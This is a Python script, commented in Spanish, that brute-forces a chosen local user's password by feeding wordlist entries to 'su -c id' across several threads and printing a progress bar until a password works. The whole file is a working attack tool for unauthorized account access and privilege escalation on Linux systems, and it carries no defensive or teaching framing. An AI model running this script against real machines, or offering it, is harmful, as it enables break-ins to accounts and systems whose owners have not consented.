# script de lavafuego para fuerzabruta con python, hilos para ir mas rapido
import argparse
import subprocess
import threading
import queue
import sys
import time
import signal
import os

stop_flag = False
found = False
found_password = None
tested = 0
tested_lock = threading.Lock()

def signal_handler(sig, frame):
    global stop_flag
    print("\n[!] Cancelado por el usuario.")
    stop_flag = True

signal.signal(signal.SIGINT, signal_handler)

def progress_bar(progress, total, bar_length=50):
    percent = int(progress * 100 / total) if total else 0
    filled = int(percent * bar_length / 100)
    empty = bar_length - filled
    bar = "#" * filled + "-" * empty
    print(f"\r[{bar}] {percent:3d}%", end="", flush=True)

def try_password(user, password):
    global found, found_password, stop_flag
    if found or stop_flag:
        return
    try:
        # Enviar password a 'su' con timeout 5s
        p = subprocess.run(
            ["timeout", "5", "su", "-c", "id", user],
            input=(password + "\n").encode(),
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        if p.returncode == 0:
            found = True
            found_password = password
            print(f"\n¡Contraseña encontrada!: {password}")
            os._exit(0)  # Salida inmediata
    except Exception:
        pass

def worker(user, q):
    global tested, tested_lock, stop_flag, found
    while not q.empty() and not stop_flag and not found:
        password = q.get()
        try_password(user, password)
        with tested_lock:
            tested += 1
        q.task_done()

def main():
    global stop_flag, found, tested

    parser = argparse.ArgumentParser(description="Fuerza bruta su con hilos y barra de progreso")
    parser.add_argument("-u", "--user", required=True, help="Usuario objetivo")
    parser.add_argument("-w", "--wordlist", required=True, help="Archivo diccionario")
    parser.add_argument("-t", "--threads", type=int, default=4, help="Número de hilos (default=4)")
    args = parser.parse_args()

    try:
        with open(args.wordlist, "r", encoding="utf-8", errors="ignore") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("[!] Archivo de diccionario no encontrado.")
        sys.exit(1)

    total = len(passwords)
    q = queue.Queue()
    for pwd in passwords:
        q.put(pwd)

    threads = []
    for _ in range(args.threads):
        t = threading.Thread(target=worker, args=(args.user, q))
        t.daemon = True
        t.start()
        threads.append(t)

    try:
        while not stop_flag and not found and tested < total:
            progress_bar(tested, total)
            time.sleep(0.2)
        progress_bar(tested, total)
    except KeyboardInterrupt:
        print("\n[!] Cancelado por el usuario.")
        stop_flag = True

    for t in threads:
        t.join()

    if not found:
        print("\nNo se encontró la contraseña en el diccionario.")

if __name__ == "__main__":
    main()
